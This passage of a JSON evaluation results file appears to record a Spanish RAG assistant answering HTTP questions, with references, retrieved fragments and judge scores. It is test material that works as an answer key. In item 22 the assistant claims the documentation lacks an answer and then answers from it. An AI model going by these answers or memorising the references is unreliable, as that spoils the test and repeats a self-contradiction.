+          {
+            "texto": "No pueden ser accedidas por scripts maliciosos",
+            "respaldada": true
+          },
+          {
+            "texto": "Mitiga el riesgo de robo de sesión a través de XSS",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 5,
+        "respaldadas": 5,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta del asistente coincide con la referencia y está respaldada por los documentos; no contiene errores ni omisiones relevantes.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 20,
+      "tipo": "factual",
+      "pregunta": "¿Qué protege el atributo SameSite de las cookies?",
+      "con_respuesta": true,
+      "referencia": "Permite pedir que la cookie no se envíe en solicitudes cross-site, lo que da cierta protección contra ataques CSRF.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 12.23,
+      "respuesta": "El atributo `SameSite` de las cookies proporciona protección contra ataques cross-site request forgery (CSRF). Según [1] y [2], este atributo permite que los servidores requieran que una cookie no sea enviada con solicitudes cross-site, lo cual ayuda a prevenir estos tipos de ataques.",
+      "respuesta_cruda": "El atributo `SameSite` de las cookies proporciona protección contra ataques cross-site request forgery (CSRF). Según [1] y [2], este atributo permite que los servidores requieran que una cookie no sea enviada con solicitudes cross-site, lo cual ayuda a prevenir estos tipos de ataques.",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "HTTP cookies > Creando cookies > Cookies `SameSite`\nLas cookies `SameSite` permiten a los servidores requerir que una cookie no sea enviada con solicitudes cross-site (donde Site es definido por el dominio registrabe), lo que proporciona algo de protección contra ataques cross-site request forgery (CSRF).  \nLas cookies `SameSite` son relativamente nuevas y soportadas por los principales navegadores.  \nAquí hay un ejemplo:  \n```\nSet-Cookie: key=value; SameSite=Strict\n```  \nEl atributo same-site puede tomar uno de los dos valores (case-insensitive):  \n- `Strict`",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies > Creando cookies > Cookies `SameSite`",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9981
+        },
+        {
+          "texto": "HTTP cookies > Creando cookies > Cookies `SameSite`\n```  \nEl atributo same-site puede tomar uno de los dos valores (case-insensitive):  \n- `Strict`\n- : Si una cookie same-site tiene este atributo, el navegador sólo enviará cookies si la solicitud se originó en el sitio web que estableció la cookie. Si la solicitud se originó desde una URL diferente que la URL del location actual, no se incluirá ninguna cookie etiquetada con el atributo `Strict`.\n- `Lax`\n- : Si el atributo se establece en Lax, las cookies same-site se retienen en (sub)peticiones cross-site, tales como llamadas para cargar imágenes o frames, pero se enviarán cuando un usuario navegue a la URL desde un sitio externo, por ejemplo, siguiendo un enlace.",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies > Creando cookies > Cookies `SameSite`",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9897
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "El atributo SameSite de las cookies proporciona protección contra ataques cross-site request forgery (CSRF).",
+            "respaldada": true
+          },
+          {
+            "texto": "Este atributo permite que los servidores requieran que una cookie no sea enviada con solicitudes cross-site, lo cual ayuda a prevenir estos tipos de ataques.",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 2,
+        "respaldadas": 2,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta del asistente coincide con la referencia: indica que SameSite impide el envío de cookies en solicitudes cross-site y brinda protección contra CSRF, sin añadir información contradictoria.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 21,
+      "tipo": "factual",
+      "pregunta": "¿Qué directiva de Cache-Control obliga a validar siempre con el servidor antes de reutilizar una respuesta?",
+      "con_respuesta": true,
+      "referencia": "no-cache.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 13.76,
+      "respuesta": "La directiva `no-cache` obliga al cliente a enviar una solicitud de validación antes de reutilizar cualquier respuesta almacenada. Esto se menciona en [1] y [2]. Además, según [3], la combinación de `max-age=0` y `must-revalidate` tiene un significado similar a `no-cache`, aunque esta práctica es residual de implementaciones anteriores a HTTP/1.1 que no podían manejar adecuadamente la directiva `no-cache`.",
+      "respuesta_cruda": "La directiva `no-cache` obliga al cliente a enviar una solicitud de validación antes de reutilizar cualquier respuesta almacenada. Esto se menciona en [1] y [2]. Además, según [3], la combinación de `max-age=0` y `must-revalidate` tiene un significado similar a `no-cache`, aunque esta práctica es residual de implementaciones anteriores a HTTP/1.1 que no podían manejar adecuadamente la directiva `no-cache`.",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "HTTP caching > No caché > Proporcionar contenido actualizado\nLa directiva `no-store` evita que se almacene una respuesta, pero no elimina ninguna respuesta ya almacenada para la misma URL.  \nEn otras palabras, si ya hay una respuesta anterior almacenada para una URL en particular, devolver `no-store` no evitará que se reutilice la respuesta anterior.  \nSin embargo, una directiva `no-cache` forzará al cliente a enviar una solicitud de validación antes de reutilizar cualquier respuesta almacenada.  \n```http\nCache-Control: no-cache\n```  \nSi el servidor no admite solicitudes condicionales, se puede obligar al cliente a acceder al servidor cada vez y obtener siempre la última respuesta con `200 OK`.",
+          "fuente": "19-http-cache.md",
+          "seccion": "HTTP caching > No caché > Proporcionar contenido actualizado",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9983
+        },
+        {
+          "texto": "HTTP caching > Validación > Forzar la revalidación\nSi no desea que se reutilice una respuesta, sino que desea obtener siempre el contenido más reciente del servidor, puede utilizar la directiva `no-cache` para forzar la validación.  \nAl agregar `Cache-Control: no-cache` a la respuesta junto con `Last-Modified` y `ETag`, como se muestra a continuación, el cliente recibirá una respuesta `200 OK` si el recurso solicitado se actualizó o de lo contrario, recibirá una respuesta `304 Not Modified` si el recurso solicitado no se ha actualizado.  \n```http\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 1024\nDate: Tue, 22 Feb 2022 22:22:22 GMT\nLast-Modified: Tue, 22 Feb 2022 22:00:00 GMT\nETag: deadbeef\nCache-Control: no-cache",
+          "fuente": "19-http-cache.md",
+          "seccion": "HTTP caching > Validación > Forzar la revalidación",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9976
+        },
+        {
+          "texto": "HTTP caching > Validación > Forzar la revalidación\n...\n```  \nA menudo se afirma que la combinación de `max-age=0` y `must-revalidate` tiene el mismo significado que `no-cache`.  \n```\nCache-Control: max-age=0, must-revalidate\n```  \n`max-age=0` significa que la respuesta es _stale_ de inmediato, y `must-revalidate` significa que no debe reutilizarse sin revalidación una vez que esté _stale_ ; por lo tanto, en combinación, la semántica parece ser la misma que `no-cache`.  \nSin embargo, ese uso de `max-age=0` es un remanente del hecho de que muchas implementaciones anteriores a HTTP/1.1 no pudieron manejar la directiva `no-cache` y, por lo tanto, para lidiar con esa limitación, `max-age =0` se utilizó como solución alternativa.",
+          "fuente": "19-http-cache.md",
+          "seccion": "HTTP caching > Validación > Forzar la revalidación",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9778
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "La directiva `no-cache` obliga al cliente a enviar una solicitud de validación antes de reutilizar cualquier respuesta almacenada.",
+            "respaldada": true
+          },
+          {
+            "texto": "Esto se menciona en [1] y [2].",
+            "respaldada": true
+          },
+          {
+            "texto": "Según [3], la combinación de `max-age=0` y `must-revalidate` tiene un significado similar a `no-cache`, aunque esta práctica es residual de implementaciones anteriores a HTTP/1.1 que no podían manejar adecuadamente la directiva `no-cache`.",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 3,
+        "respaldadas": 3,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta del asistente indica que la directiva que obliga a validar siempre es `no-cache`, que coincide con la respuesta de referencia, y todas sus afirmaciones están respaldadas por los documentos proporcionados.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 22,
+      "tipo": "factual",
+      "pregunta": "¿La autenticación HTTP Basic cifra las credenciales?",
+      "con_respuesta": true,
+      "referencia": "No: las transmite codificadas en base64, que no es cifrado. Debe usarse siempre sobre HTTPS.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 11.93,
+      "respuesta": "No lo tiene en la documentación. La descripción indica que el esquema de autenticación \"Basic\" transmite las credenciales codificadas con base64, pero no cifradas [1]. Además, se especifica que base64 puede ser decodificado fácilmente [2], por lo que no proporciona seguridad real.",
+      "respuesta_cruda": "No lo tiene en la documentación. La descripción indica que el esquema de autenticación \"Basic\" transmite las credenciales codificadas con base64, pero no cifradas [1]. Además, se especifica que base64 puede ser decodificado fácilmente [2], por lo que no proporciona seguridad real.",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Autenticación HTTP > Esquema de autenticación Basic\nEl esquema de autenticación HTTP \"Basic\" está definido en , que transmite las credenciales como un par usuario/contraseña codificado usando base64.",
+          "fuente": "20-http-autenticacion.md",
+          "seccion": "Autenticación HTTP > Esquema de autenticación Basic",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9959
+        },
+        {
+          "texto": "Autenticación HTTP > Esquema de autenticación Basic > Seguridad de la autenticación básica\nComo el usuario y la contraseña son pasados a través de la red como texto plano (éste es codificado en base64, pero base64 puede ser decodificado), el esquema de autenticación básico no es seguro. HTTPS / TLS debe ser usado junto a la autenticación básica. Sin éstas mejoras de seguridad, la autenticación básica no debe ser usada para proteger información sensible o valiosa.",
+          "fuente": "20-http-autenticacion.md",
+          "seccion": "Autenticación HTTP > Esquema de autenticación Basic > Seguridad de la autenticación básica",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9118
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "El esquema de autenticación Basic transmite las credenciales codificadas con base64, pero no cifradas.",
+            "respaldada": true
+          },
+          {
+            "texto": "Base64 puede ser decodificado fácilmente.",
+            "respaldada": true
+          },
+          {
+            "texto": "No lo tiene en la documentación.",
+            "respaldada": false
+          }
+        ],
+        "n_afirmaciones": 3,
+        "respaldadas": 2,
+        "fidelidad": 0.667,
+        "correccion": "parcial",
+        "motivo": "La respuesta menciona correctamente que Basic usa base64 y no cifra, pero omite la recomendación esencial de usar siempre HTTPS que está presente en la referencia.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 23,
+      "tipo": "factual",
+      "pregunta": "¿Qué diferencia hay entre los códigos 401 y 403 en autenticación?",
+      "con_respuesta": true,
+      "referencia": "401 indica que faltan credenciales válidas; 403 que las credenciales son válidas pero no dan acceso a ese recurso.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 11.91,
+      "respuesta": "El código de estado 401 `Unauthorized` indica que la autenticación es necesaria para acceder al recurso, mientras que el código 403 `Forbidden` se usa cuando las credenciales proporcionadas son válidas pero no permiten el acceso al recurso debido a restricciones específicas [1].",
+      "respuesta_cruda": "El código de estado 401 `Unauthorized` indica que la autenticación es necesaria para acceder al recurso, mientras que el código 403 `Forbidden` se usa cuando las credenciales proporcionadas son válidas pero no permiten el acceso al recurso debido a restricciones específicas [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Autenticación HTTP > El marco general de autenticación HTTP > Prohibición de Acceso (Access Forbbiden)\nSi el servidor proxy recibe unas credenciales válidas que no son adecuadas para acceder a un determinado recurso, el servidor respondera con el código de estado 403 `Forbidden`. Diferente al código de estado 401 `Unauthorized` o 407 `Proxy Authentication Required`, donde la autenticación es imposible para ese usuario.",
+          "fuente": "20-http-autenticacion.md",
+          "seccion": "Autenticación HTTP > El marco general de autenticación HTTP > Prohibición de Acceso (Access Forbbiden)",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9855
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "El código de estado 401 `Unauthorized` indica que la autenticación es necesaria para acceder al recurso.",
+            "respaldada": false
+          },
+          {
+            "texto": "El código 403 `Forbidden` se usa cuando las credenciales proporcionadas son válidas pero no permiten el acceso al recurso debido a restricciones específicas.",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 2,
+        "respaldadas": 1,
+        "fidelidad": 0.5,
+        "correccion": "correcta",
+        "motivo": "La respuesta del asistente reproduce la diferencia esencial entre 401 y 403 tal como la indica la respuesta de referencia: 401 requiere autenticación (credenciales faltantes o inválidas) y 403 indica credenciales válidas pero sin permiso. Solo la primera afirmación no está explícitamente respaldada por el documento proporcionado, pero la respuesta global es correcta respecto a la referencia.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 24,
+      "tipo": "sin_respuesta",
+      "pregunta": "¿Cuál es la última versión estable de Kubernetes?",
+      "con_respuesta": false,
+      "referencia": null,
+      "recall5": null,
+      "no_lo_tengo": true,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "reescribir",
+        "recuperar",
+        "evaluar",
+        "sin_respuesta"
+      ],
+      "intentos": 1,
+      "error": null,
+      "segundos": 25.05,
+      "respuesta": "No lo tengo en la documentación.",
+      "respuesta_cruda": null,
+      "salida_bloqueada": false,
+      "fragmentos": [],
+      "juez": {
+        "estado": "no_aplica",
+        "motivo": "sin_respuesta"
+      }
+    },
+    {
+      "id": 25,
+      "tipo": "sin_respuesta",
+      "pregunta": "¿Cómo se configura un pipeline en Jenkins?",
+      "con_respuesta": false,
+      "referencia": null,
+      "recall5": null,
+      "no_lo_tengo": true,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "reescribir",
+        "recuperar",
+        "evaluar",
+        "sin_respuesta"
+      ],
+      "intentos": 1,
+      "error": null,
+      "segundos": 22.63,
+      "respuesta": "No lo tengo en la documentación.",
+      "respuesta_cruda": null,
+      "salida_bloqueada": false,
+      "fragmentos": [],
+      "juez": {
+        "estado": "no_aplica",
+        "motivo": "sin_respuesta"
+      }
+    },
+    {
+      "id": 26,
+      "tipo": "sin_respuesta",
+      "pregunta": "¿Cuánto cuesta un clúster gestionado de Kubernetes en Google Cloud?",
+      "con_respuesta": false,
+      "referencia": null,
+      "recall5": null,
+      "no_lo_tengo": true,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "reescribir",
+        "recuperar",
+        "evaluar",
+        "sin_respuesta"
+      ],
+      "intentos": 1,
+      "error": null,
+      "segundos": 25.57,
+      "respuesta": "No lo tengo en la documentación.",
+      "respuesta_cruda": null,
+      "salida_bloqueada": false,
+      "fragmentos": [],
+      "juez": {
+        "estado": "no_aplica",
+        "motivo": "sin_respuesta"
+      }
+    },
+    {
+      "id": 27,
+      "tipo": "sin_respuesta",
+      "pregunta": "¿Qué diferencia hay entre GitHub Actions y GitLab CI?",
+      "con_respuesta": false,
+      "referencia": null,
+      "recall5": null,
+      "no_lo_tengo": true,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "reescribir",
+        "recuperar",
+        "evaluar",
+        "sin_respuesta"
+      ],
+      "intentos": 1,
+      "error": null,
+      "segundos": 23.41,
+      "respuesta": "No lo tengo en la documentación.",
+      "respuesta_cruda": null,
+      "salida_bloqueada": false,
+      "fragmentos": [],
+      "juez": {
+        "estado": "no_aplica",
+        "motivo": "sin_respuesta"
+      }
+    },
+    {
+      "id": 28,
+      "tipo": "sin_respuesta",
+      "pregunta": "¿Cuál es la capital de Australia?",
+      "con_respuesta": false,
+      "referencia": null,
+      "recall5": null,
+      "no_lo_tengo": true,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "reescribir",
+        "recuperar",
+        "evaluar",
+        "sin_respuesta"
+      ],
+      "intentos": 1,
+      "error": null,
+      "segundos": 23.54,
+      "respuesta": "No lo tengo en la documentación.",
+      "respuesta_cruda": null,
+      "salida_bloqueada": false,
+      "fragmentos": [],
+      "juez": {
+        "estado": "no_aplica",
+        "motivo": "sin_respuesta"
+      }
+    }
+  ]
+}
